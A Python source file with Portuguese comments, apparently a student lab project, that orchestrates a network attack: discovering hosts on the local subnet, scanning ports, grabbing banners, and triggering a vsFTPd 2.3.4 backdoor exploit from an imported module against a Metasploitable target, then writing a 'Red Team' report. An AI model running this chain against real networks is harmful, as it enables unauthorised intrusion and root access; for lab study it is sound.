import sys                 # Argumentos da linha de comando e saída
import os                  # Operações com ficheiros e diretórios
from datetime import datetime  # Datas/horas para timestamps
from typing import Optional, List, Tuple  # Type hints (hints de tipos para melhor código)

# Adiciona o diretório do script ao caminho de procura de módulos (para importar os scripts locais).
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Importa as funções dos scripts anteriores (net_scanner, port_scanner, etc.).
from net_scanner import get_my_ip, scan_with_nbtscan, scan_with_arp_scan
from port_scanner import scan_portas_multithread, SERVICOS_CONHECIDOS
from banner_grabbing import grab_banner, identificar_vulnerabilidade
from backdoor_exploit import exploit_ftp_backdoor, verificar_banner_ftp

# Configuração de relatórios e logs.
REPORT_DIR = "reports"                                    # Pasta onde guardar os relatórios
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")    # Timestamp para nomes de ficheiros
REPORT_FILE = f"{REPORT_DIR}/relatorio_ataque_{TIMESTAMP}.md"  # Ficheiro de relatório (Markdown)
LOG_FILE = f"{REPORT_DIR}/log_ataque_{TIMESTAMP}.txt"    # Ficheiro de log

# Lista de portas para o "modo rápido" (não testa todas as portas, só as mais comuns).
PORTAS_RAPIDAS = [21, 22, 80, 139, 443, 445, 1524, 3306, 5900, 8080]


def criar_diretorio_report():
    """Cria a pasta de relatórios se não existir."""
    if not os.path.exists(REPORT_DIR):
        os.makedirs(REPORT_DIR)
        print(f"[+] Pasta criada: {REPORT_DIR}")


def log_ataque(mensagem: str, tipo: str = "INFO"):
    """Escreve uma mensagem no console E no ficheiro de log, com timestamp.
    tipo: INFO, SUCCESS, WARNING, ERROR"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    linha = f"[{timestamp}] [{tipo}] {mensagem}"
    print(linha)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(linha + "\n")


def mostrar_menu():
    """Mostra o menu principal e devolve a opção escolhida pelo utilizador."""
    print("\n" + "="*60)
    print(" O QUE QUERES FAZER?")
    print("="*60)
    print("1. Ataque COMPLETO")
    print("2. So procurar hosts na rede")
    print("3. So fazer scan de portas")
    print("4. So apanhar banners dos servicos")
    print("5. So explorar a falha do vsFTPd")
    print("6. Escolher eu o IP e o que fazer")
    print("0. Sair")
    print("="*60)
    return input("\n[*] Escolhe uma opcao: ").strip()


def fase_descobrir_hosts() -> Optional[str]:
    """FASE 1: Descobre hosts na rede local.
    Usa nbtscan ou arp-scan e pede ao utilizador escolher qual atacar.
    Devolve o IP do alvo, ou None se falhar."""
    print("\n" + "="*60)
    print(" PASSO 1: VOU PROCURAR HOSTS NA REDE")
    print("="*60)
    
    # Obtém o IP local da máquina.
    meu_ip = get_my_ip()
    if not meu_ip:
        print("[-] Nao consegui descobrir o IP da maquina")
        return None
    
    # Constrói o endereço da sub-rede (ex.: 192.168.1.0/24).
    partes_ip = meu_ip.split('.')
    rede = f"{partes_ip[0]}.{partes_ip[1]}.{partes_ip[2]}.0/24"
    
    print(f"[*] O meu IP e: {meu_ip}")
    print(f"[*] Vou vasculhar a rede: {rede}")
    
    # Tenta o nbtscan primeiro.
    resultados = scan_with_nbtscan(rede)
    
    # Se falhar, tenta o arp-scan.
    if not resultados or resultados.strip() == "":
        print("[*] O nbtscan nao deu nada, vou tentar com arp-scan")
        resultados = scan_with_arp_scan(rede)
    
    if resultados and resultados.strip():
        print("\n[+] Encontrei estes hosts na rede:")
        print("-" * 50)
        
        # Extrai todos os IPs encontrados usando regex.
        import re
        ips_encontrados = re.findall(r'\d+\.\d+\.\d+\.\d+', resultados)
        
        # Remove IPs duplicados e o próprio IP local.
        hosts = [ip for ip in ips_encontrados if ip != meu_ip]
        hosts = list(dict.fromkeys(hosts))  # Remove duplicatas mantendo ordem
        
        # Mostra a lista de hosts.
        for i, host in enumerate(hosts, 1):
            print(f"    {i}. {host}")
        
        if hosts:
            print(f"\n[+] No total encontrei {len(hosts)} hosts")
            
            # Se há vários hosts, pede ao utilizador escolher qual atacar.
            if len(hosts) > 1:
                escolha = input(f"\n[*] Qual queres atacar? (1-{len(hosts)}) ou ENTER para o primeiro: ")
                if escolha.isdigit() and 1 <= int(escolha) <= len(hosts):
                    alvo = hosts[int(escolha)-1]
                else:
                    alvo = hosts[0]  # Por omissão, o primeiro
            else:
                alvo = hosts[0]  # Se só há um, escolhe automaticamente
            
            print(f"[+] Esta e a vitima: {alvo}")
            return alvo
    
    print("[-] Nao encontrei nenhum host na rede, confirma a ligacao")
    return None


def fase_scan_portas(ip_alvo: str, modo_rapido: bool = True) -> List[Tuple[int, str, float]]:
    """FASE 2: Escaneia as portas do alvo.
    modo_rapido=True -> testa só as portas comuns (rápido)
    modo_rapido=False -> testa todas as portas (mais lento)
    Devolve uma lista de tuplos (porta, serviço, tempo_resposta)."""
    print("\n" + "="*60)
    print(" PASSO 2: VOU FAZER SCAN DAS PORTAS")
    print("="*60)
    
    if modo_rapido:
        print(f"[*] Modo rapido: vou testar {len(PORTAS_RAPIDAS)} portas")
    else:
        print(f"[*] Modo completo: vou testar todas as portas (pode demorar um bocado)")
    
    # Importa a lista completa de portas do port_scanner.
    from port_scanner import portas_a_testar as PORTAS_COMPLETAS
    
    print(f"[*] Alvo: {ip_alvo}")
    print(f"[*] A comecar o scan")
    
    # Executa o scan com threading (40 threads simultâneas).
    portas_abertas = scan_portas_multithread(
        ip_alvo, 
        PORTAS_RAPIDAS if modo_rapido else PORTAS_COMPLETAS, 
        max_threads=40, 
        timeout=0.5
    )
    
    if portas_abertas:
        print(f"\n[+] Encontrei {len(portas_abertas)} portas abertas:")
        for porta, servico, tempo in portas_abertas:
            print(f"    - Porta {porta}: {servico}")
    else:
        print("[-] Nao encontrei nenhuma porta aberta")
    
    return portas_abertas


def fase_banner_grabbing(ip_alvo: str, portas: List[int]):
    """FASE 3: Apanha o banner de cada porta aberta.
    Mostra informações sobre os serviços e alerta para vulnerabilidades conhecidas."""
    print("\n" + "="*60)
    print(" PASSO 3: VOU TENTAR APANHAR BANNERS DOS SERVICOS")
    print("="*60)
    
    print(f"[*] Vou analisar {len(portas)} portas no {ip_alvo}")
    print("[*] A ver o que cada servico diz...")
    
    # Importa a função (já está no scope, mas sendo explícito).
    from banner_grabbing import grab_banner as grab_banner_func
    
    # Testa cada porta.
    for porta in portas:
        grab_banner_func(ip_alvo, porta)
    
    print("\n[+] Ja apanhei os banners todos")


def fase_exploracao(ip_alvo: str) -> bool:
    """FASE 4: Tenta explorar a vulnerabilidade vsFTPd 2.3.4.
    Devolve True se o exploit foi bem-sucedido, False caso contrário."""
    print("\n" + "="*60)
    print(" PASSO 4: VOU TENTAR EXPLORAR A FALHA DO vsFTPd")
    print("="*60)
    
    print(f"[*] Vou verificar o FTP no {ip_alvo}:21...")
    
    # Primeiro verifica se é mesmo vulnerável (versão correta).
    if verificar_banner_ftp(ip_alvo):
        print("[+] O alvo e vulneravel! A ver se conseguimos entrar...")
        
        # Pede confirmação antes de explorar (segurança).
        confirm = input("\n[!] Queres mesmo continuar com o ataque? (s/N): ")
        if confirm.lower() == 's':
            print("[*] A ativar o backdoor...")
            # Executa o exploit completo.
            success = exploit_ftp_backdoor(ip_alvo)
            if success:
                print("[+] Conseguimos! Ganhaste acesso root ao sistema!")
                return True
            else:
                print("[-] Nao consegui entrar. Algo correu mal")
        else:
            print("[*] Pronto, nao fiz nada. Ficas para a proxima")
    else:
        print("[-] Nao e vulneravel a esta falha...")
        print("[*] Talvez de para atacar por outro lado (SMB, SSH, etc.)")
    
    return False


def gerar_relatorio(ip_alvo: str, portas_abertas: List, exploit_success: bool):
    """Gera um relatório em Markdown com um resumo do ataque realizado.
    Inclui tabelas com portas abertas, serviços, e os comandos utilizados."""
    print("\n" + "="*60)
    print(" A GERAR RELATORIO DO ATAQUE")
    print("="*60)
    
    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        # Cabeçalho do relatório.
        f.write(f"# Relatorio do Ataque - Red Team\n\n")
        f.write(f"**Quando foi:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"**Quem atacou:** Kali Linux\n")
        f.write(f"**A Vitima:** {ip_alvo} (Metasploitable)\n\n")
        
        # Tabela de fases do ataque.
        f.write("## O Que Aconteceu\n\n")
        f.write("| Passo | Como Correu | Detalhes |\n")
        f.write("|------|-------------|----------|\n")
        f.write("| Encontrar hosts | Correu bem | Fiz scan da rede local |\n")
        f.write(f"| Scan de portas | Correu bem | Encontrei {len(portas_abertas)} portas abertas |\n")
        f.write("| Apanhar banners | Correu bem | Descobri quais servicos estao la |\n")
        f.write(f"| Explorar falha | {'Sucesso' if exploit_success else 'Falhou'} | Tentei o vsFTPd 2.3.4 |\n\n")
        
        # Tabela de portas abertas.
        f.write("## Portas Abertas\n\n")
        f.write("| Porta | Servico | Observacoes |\n")
        f.write("|-------|---------|-------------|\n")
        for porta, servico, _ in portas_abertas:
            # Destaca a porta 21 (FTP) como vulnerável.
            vulneravel = "Cuidado com esta! Vulneravel a vsFTPd" if porta == 21 else "-"
            f.write(f"| {porta} | {servico} | {vulneravel} |\n")
        
        # Secção com os comandos usados.
        f.write("\n## Comandos que Usei\n\n")
        f.write("```bash\n")
        f.write(f"# Para descobrir hosts na rede\n")
        f.write(f"python3 net_scanner.py\n\n")
        f.write(f"# Para escanear as portas\n")
        f.write(f"python3 port_scanner.py -> IP: {ip_alvo}\n\n")
        f.write(f"# Para apanhar os banners\n")
        f.write(f"python3 banner_grabbing.py -> IP: {ip_alvo}\n\n")
        f.write(f"# Para explorar a falha\n")
        f.write(f"python3 backdoor_exploit.py {ip_alvo}\n")
        f.write("```\n")
        
        # Links para os ficheiros de evidência.
        f.write("\n## Provas do Ataque\n\n")
        f.write(f"- Log do ataque: `{LOG_FILE}`\n")
        
    print(f"[+] Relatorio guardado em: {REPORT_FILE}")
    print(f"[+] Log do ataque guardado em: {LOG_FILE}")


def ataque_completo_auto():
    """Executa um ataque completo e automatizado.
    Faz as 4 fases (descobrir hosts, scan portas, banners, exploração) em sequência."""
    log_ataque("A COMECAR O ATAQUE COMPLETO", "SUCCESS")
    
    # FASE 1: Descobrir hosts.
    ip_alvo = fase_descobrir_hosts()
    if not ip_alvo:
        log_ataque("Nao consegui encontrar um alvo...", "ERROR")
        return
    
    # FASE 2: Scan de portas (modo rápido).
    portas_abertas = fase_scan_portas(ip_alvo, modo_rapido=True)
    if not portas_abertas:
        log_ataque("Nao ha portas abertas...", "WARNING")
        return
    
    # FASE 3: Banner grabbing.
    portas_lista = [p for p, _, _ in portas_abertas]  # Extrai os números das portas
    fase_banner_grabbing(ip_alvo, portas_lista)
    
    # FASE 4: Exploração (só se a porta 21 estiver aberta).
    exploit_success = False
    if 21 in portas_lista:
        exploit_success = fase_exploracao(ip_alvo)
    else:
        print("\n[-] A porta 21 (FTP) esta fechada...")
        print("[*] Nao ha mais nada a fazer")
    
    # Gera um relatório final.
    gerar_relatorio(ip_alvo, portas_abertas, exploit_success)
    
    log_ataque("MISSAO CUMPRIDA! ATAQUE TERMINADO", "SUCCESS")


def ataque_personalizado():
    """Ataque com opções customizadas: utilizador escolhe o IP e o que fazer."""
    ip_alvo = input("\n[*] Qual e o IP do alvo? ").strip()
    
    if not ip_alvo:
        print("[-] Isso nao e um IP valido...")
        return
    
    print(f"\n[*] Ok, o alvo e {ip_alvo}")
    
    # Menu de opções para o utilizador.
    print("\nO que queres fazer?")
    print("1. So fazer o scan de portas")
    print("2. Scan de portas e apanhar banners")
    print("3. Fazer tudo: scan, banners e explorar (recomendo)")
    opcao = input("Escolhe (1-3): ").strip()
    
    # FASE 2: Scan (modo completo, não rápido).
    portas_abertas = fase_scan_portas(ip_alvo, modo_rapido=False)
    if not portas_abertas:
        return
    
    portas_lista = [p for p, _, _ in portas_abertas]
    
    # FASE 3: Banner grabbing (se escolheu opção 2 ou 3).
    if opcao in ["2", "3"]:
        fase_banner_grabbing(ip_alvo, portas_lista)
    
    # FASE 4: Exploração (só se escolheu opção 3 e porta 21 está aberta).
    exploit_success = False
    if opcao == "3":
        if 21 in portas_lista:
            exploit_success = fase_exploracao(ip_alvo)
        else:
            print("[-] A porta 21 nao esta aberta... nao consigo fazer o exploit")
    
    # Gera relatório.
    gerar_relatorio(ip_alvo, portas_abertas, exploit_success)


def main():
    """Fluxo principal: cria pastas, mostra menu e executa as opções do utilizador."""
    criar_diretorio_report()
    
    log_ataque("Ferramenta de ataque iniciada", "INFO")
    log_ataque(f"Vou guardar os relatorios na pasta: {REPORT_DIR}")
    
    # Loop infinito até o utilizador escolher sair (opção 0).
    while True:
        opcao = mostrar_menu()
        
        if opcao == "1":
            # Ataque completo automatizado.
            ataque_completo_auto()
        elif opcao == "2":
            # Só descobrir hosts.
            ip = fase_descobrir_hosts()
            if ip:
                print(f"\n[+] Encontrei este host: {ip}")
        elif opcao == "3":
            # Só scan de portas (utilizador dá o IP).
            ip = input("Qual e o IP do alvo? ").strip()
            if ip:
                fase_scan_portas(ip, modo_rapido=False)
        elif opcao == "4":
            # Só banner grabbing (utilizador dá IP e portas).
            ip = input("Qual e o IP do alvo? ").strip()
            if ip:
                portas_input = input("Quais portas? (separadas por virgula, ex: 21,22,80): ").strip()
                if portas_input:
                    portas = [int(p.strip()) for p in portas_input.split(",")]
                    fase_banner_grabbing(ip, portas)
        elif opcao == "5":
            # Só exploração (utilizador dá o IP).
            ip = input("Qual e o IP do alvo? ").strip()
            if ip:
                fase_exploracao(ip)
        elif opcao == "6":
            # Ataque personalizado (utilizador controla tudo).
            ataque_personalizado()
        elif opcao == "0":
            # Sair.
            print("\n[*] A fechar... ate a proxima")
            log_ataque("Ferramenta fechada pelo utilizador", "INFO")
            break
        else:
            print("[-] Opcao invalida... escolhe outra")
        
        input("\n\n[*] Pressiona ENTER para continuar...")


# Entrada do programa: trata Ctrl+C e erros não apanhados.
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # Se o utilizador pressionar Ctrl+C.
        print("\n\n[!] Pressionaste Ctrl+C... a fechar")
        sys.exit(0)
    except Exception as e:
        # Se houver um erro inesperado.
        print(f"\n[!] Aconteceu um erro inesperado: {e}")
        sys.exit(1)